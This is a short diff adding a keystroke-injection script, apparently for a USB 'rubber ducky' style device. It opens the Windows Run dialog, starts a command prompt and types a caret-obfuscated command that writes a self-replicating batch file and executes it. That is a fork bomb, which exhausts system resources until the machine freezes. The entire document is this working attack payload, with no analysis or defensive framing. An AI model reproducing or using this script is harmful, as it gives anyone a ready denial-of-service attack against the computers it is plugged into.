@@ -1,0 +1,7 @@
+GUI r
+DELAY 1000
+STRING cmd
+ENTER
+DELAY 1750
+STRING @echo.%0^|%0>$^_^.c^md&$_>nul
+ENTER
